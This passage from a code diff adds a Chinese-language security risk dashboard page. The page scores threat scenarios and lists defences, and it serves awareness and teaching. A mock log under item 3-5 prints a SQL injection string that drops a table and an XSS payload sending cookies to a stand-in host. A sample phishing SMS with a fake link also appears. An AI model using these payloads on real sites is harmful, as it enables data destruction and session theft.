+    source: "修補程式管理 (Patching)、縱深防禦機制、零信任架構與入侵偵測系統 (IDS)",
+    tips: ["訂閱漏洞情資，重大漏洞公布後 72 小時內評估修補", "網段切分，避免單點突破即全面淪陷", "以行為偵測（EDR／UEBA）補足特徵碼偵測的不足"],
+    kw: "零時差攻擊, 程式漏洞攻擊, 未知威脅, 資料外洩, 系統滲透", page: "資安核心概念 第9頁" },
+
+  { g: 2, id: "2-4", ident: "分散式阻斷攻擊 (DDoS)", L: 4, I: 4,
+    scene: "外部大量異常垃圾流量瞬間衝進系統，導致前台網站回應變慢並最終崩潰斷線。",
+    mock: { type: "log", title: "網站監控告警",
+      text: "[14:02:11] WARN  inbound traffic 1.2 Gbps  (baseline 40 Mbps)\n[14:02:13] WARN  unique source IPs: 48,392\n[14:02:20] CRIT  HTTP 503 ratio 87%\n[14:02:31] CRIT  web-01 / web-02 health check FAILED" },
+    risk: "大量分散來源的異常流量耗盡頻寬或伺服器資源，合法使用者無法下單或查詢，直接造成營收損失；DDoS 也常被用來掩護同時進行的其他入侵行動。",
+    source: "導入 DDoS 流量清洗服務 (CDN/Cloudflare)、頻寬限制與異常 IP 自動封鎖",
+    tips: ["設定請求速率限制（Rate Limiting）", "隱藏源站真實 IP，只允許 CDN 回源", "預先規劃 DDoS 應變流程與對外公告範本"],
+    kw: "分散式阻斷攻擊, DDoS, 流量攻擊, 網站癱瘓, 服務中斷", page: "資安核心概念 第9頁" },
+
+  { g: 2, id: "2-5", ident: "供應鏈攻擊 (Supply Chain Attack)", L: 3, I: 5,
+    scene: "廠商或外部供應商連線端安全漏洞遭駭客濫用，進而滲透企業內部核心系統。",
+    risk: "攻擊者先攻破防護較弱、但受信任的第三方廠商，再沿著信任關係滲透進來。廠商帳號通常權限大、監控少，入侵後不易察覺。",
+    source: "落實第三方廠商資安風險評估、最小權限存取控制 (RBAC) 與連線稽核",
+    tips: ["合約中明定廠商資安要求與事件通報義務", "廠商遠端連線採即時開通、用完即關", "盤點所有廠商帳號與連線管道並定期複核"],
+    kw: "供應鏈攻擊, 第三方風險, 廠商權限控管, 信任鏈滲透", page: "資安核心概念 第9頁" },
+
+  /* ---------- 3. 系統安全開發 (SSDLC) ---------- */
+  { g: 3, id: "3-1", ident: "Access Control（存取控制）", L: 3, I: 4,
+    scene: "「看人用菜單」，每個人登入後只能看到自己該看的東西（如廠商／司機只能看訂單）。",
+    risk: "任一低權限帳號（如司機）被盜，攻擊者就能看到全公司的財務與客戶資料；也常見「前端隱藏按鈕、後端未檢查」導致越權存取（IDOR）。",
+    source: "實施角色型存取控制 (RBAC)，資料列級/欄位級權限過濾",
+    tips: ["遵循最小權限原則，預設拒絕、按需開放", "權限檢查一律在伺服器端執行", "定期盤點帳號權限，離職與異動即時調整"],
+    kw: "Access Control, 存取控制, 角色權限 (RBAC), 最小權限原則", page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-2", ident: "Authenticity（身分驗證／可信度）", L: 4, I: 5,
+    scene: "除了基本密碼外，必須強制綁定手機輸入動態密碼才能真正登入系統。",
+    risk: "僅靠密碼容易因撞庫、釣魚或弱密碼被盜用，攻擊者以合法身分登入，系統難以分辨。帳號盜用是多數入侵事件的起點。",
+    source: "導入多因子驗證 (MFA / TOTP)，防範憑證盜用與弱密碼風險",
+    tips: ["搭配登入失敗鎖定與異常登入通知", "優先採用驗證器 App 或實體金鑰，降低簡訊攔截風險", "重設密碼流程同樣需要多因子驗證"],
+    kw: "Authenticity, 雙重驗證 (2FA/MFA), 動態密碼 (OTP), 身分確認", page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-3", ident: "Communication Security & Confidentiality（通訊安全與機密性）", L: 3, I: 4,
+    scene: "外派業務於機場／咖啡廳等公共 Wi-Fi 處理訂單，資料傳輸絕不能被偷看或亂改。",
+    risk: "公共 Wi-Fi 極易遭側錄或架設假熱點（Evil Twin）進行中間人攻擊，訂單內容、帳密與客戶資料被竊聽或竄改。",
+    source: "全站強制端到端 HTTPS (TLS 1.3) 加密傳輸，禁止明文傳輸",
+    tips: ["外出處理公務一律透過公司 VPN", "App 端實作憑證驗證，拒絕無效憑證", "教育員工避免連線不明的免費 Wi-Fi"],
+    kw: "Communication Security, 傳輸加密, SSL/TLS, 防竊聽, 防竄改", page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-4", ident: "Information Confidentiality & Encryption（資訊機密與加密）", L: 3, I: 5,
+    scene: "系統儲存客戶信用卡號與敏感個人資料，主機即使遭竊也需確保資料不外洩。",
+    risk: "硬碟、備份或資料庫檔案被帶走即可直接讀取卡號與個資，將面臨個資法責任、信用卡組織罰款與商譽損失。",
+    source: "採用 AES-256 高強度靜態資料加密 (Encryption at Rest) 與去識別化",
+    tips: ["金鑰與資料分開保管（KMS／HSM）", "非必要不儲存卡號，必要時做遮罩或 Token 化", "備份檔同樣需加密"],
+    kw: "Information Confidentiality, Encryption, 敏感資料保護, 靜態加密", page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-5", ident: "Against Attack（防範攻擊／輸入防護）", L: 4, I: 5,
+    scene: "防範黑客在網頁搜尋欄／留言板輸入奇怪符號或電腦指令，並能自動擋掉垃圾流量。",
+    mock: { type: "log", title: "搜尋欄收到的輸入",
+      text: "q = ' OR 1=1; DROP TABLE orders; --\nq = &lt;script&gt;fetch('//evil.site/?c='+document.cookie)&lt;\/script&gt;" },
+    risk: "SQL Injection 可讀取或刪除整個資料庫，XSS 可竊取使用者 Cookie 冒用登入。這類攻擊門檻低、自動化工具普遍，是網站最常見的入侵手法。",
+    source: "強健的輸入驗證 (Input Validation)、參數化查詢 (WAF) 與資安防護",
+    tips: ["資料庫查詢一律使用參數化查詢", "輸出到頁面時做 HTML 編碼，並設定 CSP", "上線前進行弱點掃描與源碼檢測"],
+    kw: "Against Attack, 輸入驗證, 防SQL注入, 防XSS, 自動防禦", page: "資安核心概念 第16頁" },
+
+  { g: 3, id: "3-6", ident: "Audit Trail & Non-repudiation & Accountability（稽核軌跡與不可否認性）", L: 3, I: 4,
+    scene: "內部員工改動系統金額等關鍵紀錄，系統必須有不可塗改／刪除的紀錄作為鐵證。",
+    risk: "內部舞弊難以發現，事後也無法證明「誰、何時、改了什麼」，當事人可否認；資安事件發生時缺乏調查依據。",
+    source: "建立唯讀寫一次 (WORM) 區塊鏈或不可竄改日誌稽核軌跡 (Audit Log)",
+    tips: ["日誌集中保存於獨立主機，一般管理者無刪除權限", "關鍵金額異動需雙人覆核並記錄簽核者", "定期抽查日誌並設定異常異動告警"],
+    kw: "Audit Trail, Non-repudiation, Accountability, 稽核軌跡, 不可否認性", page: "資安核心概念 第16頁" },
+
+  /* ---------- 4. 資安管控模式 ---------- */
+  { g: 4, id: "4-1", ident: "資安管理組織架構", tag: "策略面 Strategic", L: 3, I: 4,
+    scene: "總召集人麗麗統籌全局，成立指揮中心，進行決策與整體風險控制。",
+    risk: "缺乏明確權責組織，資安事件發生時容易多頭馬車、延誤處置；資安需求也無法取得高層支持與資源。",
+    source: "成立資安專責應變小組與跨部門指揮決策架構",
+    tips: ["明定資安長與各部門窗口的權責分工", "建立事件升級與決策流程", "定期向高層報告資安風險狀況"],
+    kw: "策略面, 資安管理組織架構, 指揮中心, 決策與資源分配", page: "資安核心概念 第11頁" },
+
+  { g: 4, id: "4-2", ident: "業務核心目標", tag: "策略面 Strategic", L: 3, I: 3,
+    scene: "決策將大部份預算投入租用高安全性雲端伺服器，優先保障系統核心安全。",
+    risk: "預算平均分散或投入非關鍵項目，核心系統反而防護不足。另需留意：預算集中於雲端，不能忽略人員訓練與端點防護；上雲也不代表安全責任完全轉移。",
+    source: "以資安風險為導向之預算分配與戰略防禦規劃",
+    tips: ["盤點核心資產並依風險排定保護優先順序", "釐清雲端共同責任模型下自身的設定與管理責任", "保留預算給教育訓練與應變演練"],
+    kw: "策略面, 業務核心目標, 資源合理配置, 雲端伺服器安全", page: "資安核心概念 第11頁" },
+
+  { g: 4, id: "4-3", ident: "事件處理及營運持續", tag: "策略面 Strategic", L: 3, I: 5,
+    scene: "制定「危機應變計畫」，確保支付功能遭癱瘓時能迅速切換備份系統並調用備援。",
+    risk: "支付等關鍵服務一旦中斷便無法恢復，營收與客戶信任直接受損；遭勒索軟體加密時若無可用備份，可能被迫付贖金。",
+    source: "建立業務持續運作計畫 (BCM)、災難復原 (DR) 與應變 SOP",
+    tips: ["訂定 RTO／RPO 目標並定期實際演練切換", "備份採 3-2-1 原則，並保留一份離線備份", "定期驗證備份可成功還原"],
+    kw: "策略面, 事件處理及營運持續, BCM, 備援系統, 應變計畫", page: "資安核心概念 第11頁" },
+
+  { g: 4, id: "4-4", ident: "風險識別與管控機制", tag: "管理面 Managerial", L: 5, I: 4,
+    scene: "小華拿著點名表嚴格執行日常行為準則，識別出最大資安漏洞在於「人」。",
+    risk: "人為疏失（弱密碼、亂點連結、資料隨意分享）持續存在卻無人發現。多數資安事件都源自人為因素，本報告中已造成損失的 2-1、2-2 皆屬此類。",
+    source: "建立定期風險評估流程與人員安全行為規範",
+    tips: ["每年至少一次全面風險評估", "訂定人員安全行為規範並定期檢核", "對財務、IT 等高風險職務加強管控與訓練"],
+    kw: "管理面, 風險識別與管控機制, 人為漏洞, 行為準則", page: "資安核心概念 第12頁" },
+
+  { g: 4, id: "4-5", ident: "建立程序化流程", tag: "管理面 Managerial", L: 4, I: 4,
+    scene: "強制規定攤位密碼不得為生日／123456、綁定雙重驗證；發現變更帳戶詐騙即發公告。",
+    mock: { type: "sms", title: "攤位群組收到的簡訊",
+      text: ["【園遊會金流中心】您的攤位收款帳戶已被變更，若非本人操作，請於 30 分鐘內點擊連結驗證身分，逾期將凍結款項：", "http://pay-center-verify.xyz/login"] },
+    risk: "弱密碼可在數秒內被猜中；發現詐騙時沒有標準通報流程，消息傳遞慢、處置不一致，更多人會受害。",
+    source: "制定標準密碼政策、身分審核流程與即時通報處置 SOP",
+    tips: ["密碼政策明定長度、複雜度並禁用常見密碼", "建立單一、簡單的詐騙通報窗口", "通報後定時發布處置進度，避免謠言"],
+    kw: "管理面, 建立程序化流程, 密碼原則, 通報機制, 標準作業", page: "資安核心概念 第12頁" },
+
+  { g: 4, id: "4-6", ident: "提升危機意識", tag: "管理面 Managerial", L: 4, I: 4,
+    scene: "平時落實攤位人員宣導與安全規範，提醒同學辨識釣魚郵件，提升整體危機意識。",
+    risk: "再好的技術防護，也擋不住使用者自己點開釣魚連結或交出密碼。缺乏意識的人員是社交工程攻擊最容易突破的目標。",
+    source: "實施定期資安教育訓練與社交工程演練宣導",
+    tips: ["每季進行社交工程演練並追蹤點擊率", "以真實案例（如 2-2 詐騙）做為教材", "建立一鍵回報可疑郵件的管道"],
+    kw: "管理面, 提升危機意識, 教育訓練, 社交工程防禦, 危機感知", page: "資安核心概念 第12頁" },
+
+  { g: 4, id: "4-7", ident: "網路防禦措施", tag: "技術面 Technical", L: 5, I: 4,
+    scene: "系統架設「防火牆」與「入侵偵測系統」，自動封鎖每秒數千次 Try 密碼的 IP。",
+    mock: { type: "log", title: "IDS 告警紀錄",
+      text: "[ALERT] Brute-force detected: user=admin\n        src=203.0.113.45  attempts=3,482/sec\n[ACTION] src 203.0.113.45 blocked by firewall (24h)" },
+    risk: "暴力破解可無限制持續嘗試，弱密碼帳號遲早被攻破；缺乏偵測也使入侵行為無人察覺。對外服務每天都會遭遇此類自動化攻擊。",
+    source: "部署網路防火牆 (FW)、入侵偵測/防禦系統 (IDS/IPS) 與 IP 自動封鎖",
+    tips: ["防火牆採預設拒絕，只開放必要服務", "定期檢視告警並調校規則，降低誤判", "告警接入集中監控（SOC／SIEM）"],
+    kw: "技術面, 網路防禦措施, 防火牆, 入侵偵測, IP封鎖, 暴力破解", page: "資安核心概念 第13頁" },
+
+  { g: 4, id: "4-8", ident: "身分驗證與存取", tag: "技術面 Technical", L: 4, I: 5,
+    scene: "管理者帳號密碼保護防爆破，並強制綁定手機進行二次驗證。",
+    risk: "管理者帳號權限最高，一旦被盜即可關閉防護、刪除日誌、竊取全部資料，影響最大。",
+    source: "實施強密碼原則與雙重因子驗證 (2FA/MFA) 存取控制",
+    tips: ["管理介面限制來源 IP，不對外開放", "一般帳號與管理帳號分離，日常作業不使用管理帳號", "管理者操作全程記錄"],
+    kw: "技術面, 身分驗證與存取, 2FA, 雙重驗證, 權限控管", page: "資安核心概念 第13頁" },
+
+  { g: 4, id: "4-9", ident: "資料保護措施", tag: "技術面 Technical", L: 3, I: 5,
+    scene: "所有線上點餐信用卡與個人資料，於傳輸過程及資料庫皆套上「加密防護罩」。",
+    risk: "信用卡與個資在傳輸中被竊聽，或資料庫外洩後被直接讀取，將面臨法律責任、主管機關裁罰與商譽損失。",
+    source: "運用 AES/TLS 高強度資料加密技術保護傳輸與靜態資料",
+    tips: ["傳輸使用 TLS 1.2+，資料庫加密敏感欄位", "落實金鑰管理與定期輪替", "遵循 PCI DSS 等支付安全規範"],
+    kw: "技術面, 資料保護措施, 加密防護罩, 資料傳輸加密, 敏感資訊", page: "資安核心概念 第13頁" }
+];
+
+/* 六大風險主軸 */
+const THEMES = [
+  { icon: "📡", title: "明文傳輸與服務暴露", ids: ["1-1", "1-2", "1-4", "1-5", "1-6", "1-7", "3-3"],
+    text: "多項服務以明文傳輸，RDP、資料庫等高價值服務若直接對外，將成為最主要的入侵入口。" },
+  { icon: "🔑", title: "身分驗證與帳號安全", ids: ["3-2", "4-5", "4-7", "4-8", "3-1"],
+    text: "單一密碼、弱密碼與暴力破解是帳號遭盜用的主因，管理者帳號尤其需要 MFA 保護。" },
+  { icon: "🧑", title: "人為因素與社交工程", ids: ["2-1", "2-2", "4-4", "4-6"],
+    text: "實際損失都來自人員判斷失誤，需要以教育訓練、演練與覆核流程補強。" },
+  { icon: "🔒", title: "敏感資料保護", ids: ["3-4", "4-9", "3-5", "1-6"],
+    text: "信用卡與個資需在傳輸與儲存兩端都加密，並防範注入攻擊直接竊取資料庫。" },
+  { icon: "⚡", title: "服務可用性與營運持續", ids: ["2-4", "4-3"],
+    text: "DDoS 或系統癱瘓將直接中斷營收，備援切換與復原計畫必須事先演練。" },
+  { icon: "🔗", title: "第三方、未知漏洞與治理", ids: ["2-3", "2-5", "3-6", "4-1", "4-2"],
+    text: "廠商連線、零時差漏洞與內部舞弊不易察覺，需要縱深防禦、稽核軌跡與組織治理支撐。" }
+];
+
+/* =========================================================
+ * 計算與工具
+ * ========================================================= */
+const level = s => s >= 15 ? "high" : s >= 8 ? "mid" : "low";
+const LV_TEXT = { high: "高風險", mid: "中風險", low: "低風險" };
+DATA.forEach(d => { d.score = d.L * d.I; d.lv = level(d.score); });
+const byId = Object.fromEntries(DATA.map(d => [d.id, d]));
+const $ = s => document.querySelector(s);
+const cnt = lv => DATA.filter(d => d.lv === lv).length;
+
+/* ---------- KPI ---------- */
+function renderKpis() {
+  const n = DATA.length;
+  const pct = c => Math.round(c / n * 100) + "%";
+  $("#kpis").innerHTML = `
+    <div class="card kpi all"><span>分析情境總數</span><b>${n}</b><small>4 大主題</small></div>
+    <div class="card kpi high"><span>高風險</span><b>${cnt("high")}</b><small>佔 ${pct(cnt("high"))}</small></div>
+    <div class="card kpi mid"><span>中風險</span><b>${cnt("mid")}</b><small>佔 ${pct(cnt("mid"))}</small></div>
+    <div class="card kpi low"><span>低風險</span><b>${cnt("low")}</b><small>佔 ${pct(cnt("low"))}</small></div>`;
+}
+
+/* ---------- 風險矩陣 ---------- */
+function dotHtml(d) {
+  return `<button type="button" class="dot ${d.lv}" data-go="${d.id}" title="${d.id} ${d.ident}（${d.L}×${d.I}=${d.score}）">${d.id}</button>`;
+}
+function renderMatrix() {
+  let html = "";
+  for (let i = 5; i >= 1; i--) {
+    html += `<div class="axis" title="衝擊">${i === 5 ? "衝擊<br>5" : i}</div>`;
+    for (let l = 1; l <= 5; l++) {
+      const items = DATA.filter(d => d.I === i && d.L === l);
+      html += `<div class="cell z-${level(i * l)}" role="gridcell" aria-label="可能性 ${l}，衝擊 ${i}">${items.map(dotHtml).join("")}</div>`;
+    }
+  }
+  html += `<div></div>` + [1, 2, 3, 4, 5].map(l => `<div class="axis">${l}</div>`).join("");
+  $("#matrix").innerHTML = html;
+}
+
+/* ---------- 主題分布 ---------- */
+function renderTopicDist() {
+  $("#topicDist").innerHTML = Object.keys(GROUPS).map(g => {
+    const ds = DATA.filter(d => d.g === +g);
+    const h = ds.filter(d => d.lv === "high").length;
+    const m = ds.filter(d => d.lv === "mid").length;
+    const l = ds.filter(d => d.lv === "low").length;
+    const w = c => (c / ds.length * 100) + "%";
+    return `<div class="topic-row">
+        <div class="lbl"><span>${g}. ${GROUPS[g]}</span><span>高 ${h}・中 ${m}・低 ${l}</span></div>
+        <div class="stack" role="img" aria-label="高 ${h}、中 ${m}、低 ${l}">
+          ${h ? `<span class="h" style="width:${w(h)}"></span>` : ""}
+          ${m ? `<span class="m" style="width:${w(m)}"></span>` : ""}
+          ${l ? `<span class="l" style="width:${w(l)}"></span>` : ""}
+        </div>
+      </div>`;
+  }).join("");
+
+  const avg = g => {
+    const ds = DATA.filter(d => d.g === g);
+    return (ds.reduce((s, d) => s + d.score, 0) / ds.length).toFixed(1);
+  };
+  const top = DATA.slice().sort((a, b) => b.score - a.score).filter(d => d.score === 25);
+  $("#avgBox").innerHTML =
+    `平均風險分數：` + Object.keys(GROUPS).map(g => `主題${g} <b>${avg(+g)}</b>`).join("　") +
+    `<br>最高風險（25 分）：` + top.map(d => `<b>${d.id}</b> ${d.ident.split(" (")[0].split("（")[0]}`).join("、");
+}
+
+/* ---------- 模擬畫面 ---------- */
+function renderMock(m) {
+  if (!m) return "";
+  const icons = { email: "✉ 模擬郵件", sms: "💬 模擬簡訊", log: "▣ 系統紀錄", file: "⬇ 模擬檔案" };
+  let body;
+  if (m.type === "email") {
+    body = `<div class="mock-meta"><div><b>寄件者：</b>${m.from}</div><div><b>主旨：</b>${m.subject}</div></div>` +
+      m.body.map(p => `<p>${p}</p>`).join("");
+  } else if (m.type === "sms") {
+    body = m.text.map(p => `<p>${p}</p>`).join("");
+  } else {
+    body = m.text;
+  }
+  return `<div class="mock ${m.type}"><div class="mock-head"><span class="dots"><i></i><i></i><i></i></span>${icons[m.type]}・${m.title}</div><div class="mock-body">${body}</div></div>`;
+}
+
+/* ---------- 情境卡片 ---------- */
+function cardHtml(d) {
+  const identLabel = d.g === 1 ? "識別服務" : d.g === 2 ? "威脅類型" : d.g === 3 ? "SSDLC 要求" : "對應子項目";
+  const riskLabel = d.g >= 3 ? "⚠ 風險識別（若未落實）" : "⚠ 風險識別";
+  return `
+    <article class="card sc" id="sc-${d.id}">
+      <div class="sc-head">
+        <span class="sc-id">${d.id}</span>
+        <div class="sc-main">
+          <p class="sc-scene">${d.scene}</p>
+          <div class="sc-ident"><span class="k">${identLabel}</span><b>${d.ident}</b>${d.tag ? `<span class="tag">${d.tag}</span>` : ""}</div>
+          ${d.g === 1 ? `<p class="note">技術特性：${d.source}</p>` : ""}
+          ${renderMock(d.mock)}
+        </div>
+        <div class="score">
+          <span class="lv ${d.lv}">${LV_TEXT[d.lv]}</span>
+          <span class="num ${d.lv}">${d.score}</span>
+          <small>L${d.L} × I${d.I}</small>
+        </div>
+      </div>
+      <div class="sc-body">
+        <div>
+          <h4>${riskLabel}</h4>
+          <p class="txt">${d.risk}</p>
+        </div>
+        <div>
+          <h4>🛡 防範建議</h4>
+          ${d.g === 1 ? "" : `<p class="source"><span>表列對應防禦</span>${d.source}</p>`}
+          <ul>${d.tips.map(t => `<li>${t}</li>`).join("")}</ul>
+        </div>
+      </div>
+      <div class="sc-foot">
+        <div class="kw">${d.kw.split(",").map(k => `<span>${k.trim()}</span>`).join("")}</div>
+        <span class="ref">📘 ${d.page}</span>
+      </div>
+    </article>`;
+}
+
+/* ---------- 篩選 ---------- */
+const filter = { g: "all", lv: "all", q: "" };
+
+function renderFilters() {
+  const topicBtns = [["all", "全部主題"], ...Object.entries(GROUPS).map(([k, v]) => [k, `${k}. ${v}`])];
+  $("#topicFilter").innerHTML = topicBtns.map(([k, v]) =>
+    `<button type="button" data-g="${k}" aria-pressed="${k === filter.g}">${v}</button>`).join("");
+  const riskBtns = [["all", "全部等級"], ["high", "高"], ["mid", "中"], ["low", "低"]];
+  $("#riskFilter").innerHTML = riskBtns.map(([k, v]) =>
+    `<button type="button" data-lv="${k}" aria-pressed="${k === filter.lv}">${v}</button>`).join("");
+}
+
+function renderList() {
+  const q = filter.q.trim().toLowerCase();
+  const hit = d =>
+    (filter.g === "all" || d.g === +filter.g) &&
+    (filter.lv === "all" || d.lv === filter.lv) &&
+    (!q || [d.id, d.scene, d.ident, d.tag, d.kw, d.risk, d.source].join(" ").toLowerCase().includes(q));
+
+  const shown = DATA.filter(hit);
+  $("#count").textContent = `顯示 ${shown.length} / ${DATA.length}`;
+  if (!shown.length) { $("#list").innerHTML = `<p class="empty">沒有符合條件的情境。</p>`; return; }
+
+  $("#list").innerHTML = Object.keys(GROUPS).map(g => {
+    const items = shown.filter(d => d.g === +g);
+    if (!items.length) return "";
+    return `<h3 class="group-head">${g}. ${GROUPS[g]}</h3><div class="scenarios">${items.map(cardHtml).join("")}</div>`;
+  }).join("");
+}
+
+/* ---------- 總結 ---------- */
+function renderSummary() {
+  const n = DATA.length, h = cnt("high");
+  const g1 = DATA.filter(d => d.g === 1 && d.lv === "high").map(d => d.tag.replace("Port ", "")).join("、");
+  $("#lead").innerHTML =
+    `本次共分析 <b>${n}</b> 個情境，其中 <b>${h} 個高風險（${Math.round(h / n * 100)}%）</b>、${cnt("mid")} 個中風險、${cnt("low")} 個低風險。` +
+    `最需優先處理的是 <b>2-2 商業郵件詐騙</b>與 <b>1-7 RDP 對外開放</b>（皆為 25 分），其次為 Port ${g1} 等直接暴露的服務，以及身分驗證、輸入防護與管理者帳號保護。` +
+    `整體而言，風險集中在「傳輸未加密」「帳號只靠密碼」「人員易受社交工程」三個面向。`;
+
+  $("#themes").innerHTML = THEMES.map(t => `
+    <div class="card theme">
+      <h3><span aria-hidden="true">${t.icon}</span>${t.title}</h3>
+      <p>${t.text}</p>
+      <div class="refs">${t.ids.map(id => dotHtml(byId[id])).join("")}</div>
+    </div>`).join("");
+}
+
+/* ---------- 事件 ---------- */
+function goTo(id) {
+  // 若目前篩選隱藏了該情境，先重設篩選
+  if (!document.getElementById("sc-" + id)) {
+    filter.g = "all"; filter.lv = "all"; filter.q = "";
+    $("#search").value = "";
+    renderFilters(); renderList();
+  }
+  const el = document.getElementById("sc-" + id);
+  el.scrollIntoView({ block: "start" });
+  el.classList.add("flash");
+  setTimeout(() => el.classList.remove("flash"), 1600);
+}
+
+document.addEventListener("click", e => {
+  const go = e.target.closest("[data-go]");
+  if (go) { goTo(go.dataset.go); return; }
+  const gb = e.target.closest("#topicFilter button");
+  if (gb) { filter.g = gb.dataset.g; renderFilters(); renderList(); return; }
+  const lb = e.target.closest("#riskFilter button");
+  if (lb) { filter.lv = lb.dataset.lv; renderFilters(); renderList(); }
+});
+$("#search").addEventListener("input", e => { filter.q = e.target.value; renderList(); });
+
+/* ---------- 初始化 ---------- */
+renderKpis();
+renderMatrix();
+renderTopicDist();
+renderFilters();
+renderList();
+renderSummary();
+</script>
+</body>
+</html>
